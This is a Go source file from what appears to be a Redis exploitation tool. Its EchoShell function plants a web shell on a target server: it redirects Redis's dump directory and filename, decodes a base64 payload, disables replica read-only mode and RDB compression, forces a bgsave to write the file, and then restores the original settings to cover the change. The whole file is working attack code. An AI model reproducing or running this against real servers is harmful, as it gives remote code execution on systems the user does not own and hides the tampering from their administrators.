package pkg

import (
	"context"
	"encoding/base64"
	"fmt"
	"strings"
	"time"
)

func EchoShell(dir, dbfilename, webshell string) {
	RedisVersion(false)

	dir = fmt.Sprintf("config set dir %v", dir)
	dbfilename = fmt.Sprintf("config set dbfilename %v", dbfilename)

	if b64 {
		decodeBytes, err := base64.StdEncoding.DecodeString(webshell)
		if err != nil {
			fmt.Println(err)
			return
		}
		webshell = string(decodeBytes)
	}

	webshell = fmt.Sprintf("\n\n\n\n\n%v\n\n\n\n", webshell)

	RunRedisCmd(dir)
	RunRedisCmd(dbfilename)

	ctx := context.Background()
	ok, err := Rdb.Set(ctx, "webshell", webshell, time.Minute*2).Result()

	readOnly := getRedisValue("config get slave-read-only")

	if err != nil {
		if strings.Contains(err.Error(), "READONLY You can't write against a read only replica.") {
			fmt.Println("[GG]\t目标开启了主从, 尝试关闭 slave-read-only 来写入文件")

			if strings.EqualFold(readOnly, "yes") {
				RunRedisCmd("config set slave-read-only no")
				ok, _ = Rdb.Set(ctx, "webshell", webshell, time.Minute*2).Result()
			}

		} else {
			fmt.Println(err)
			return
		}
	}

	fmt.Printf("[%v]\t%v\n", ok, "set webshell "+strings.ReplaceAll(webshell, "\n", ""))

	// 关闭redis压缩来写入文件
	compression := getRedisValue("config get rdbcompression")

	if strings.EqualFold(compression, "yes") {
		RunRedisCmd("config set rdbcompression no")
	}

	RunRedisCmd("bgsave")

	// 恢复原来的配置
	defer defaultConfig(compression, readOnly)
}

func RunRedisCmd(cmd string) {
	res, err := RedisCmd(cmd)

	if err != nil {
		fmt.Printf("[%v]\t%v\n", GbkToUtf8(err.Error()), cmd)
	} else {
		fmt.Printf("[%v]\t%v\n", res, GbkToUtf8(cmd))
	}
}

// 恢复原来的配置
func defaultConfig(compression, readOnly string) {
	RunRedisCmd("del webshell")

	RunRedisCmd(fmt.Sprintf("config set dir %v", Redis_dir))
	RunRedisCmd(fmt.Sprintf("config set dbfilename %v", Redis_dbfilename))

	RunRedisCmd("config set rdbcompression " + compression)
	RunRedisCmd("config set slave-read-only " + readOnly)
	//RunRedisCmd("bgsave")
}
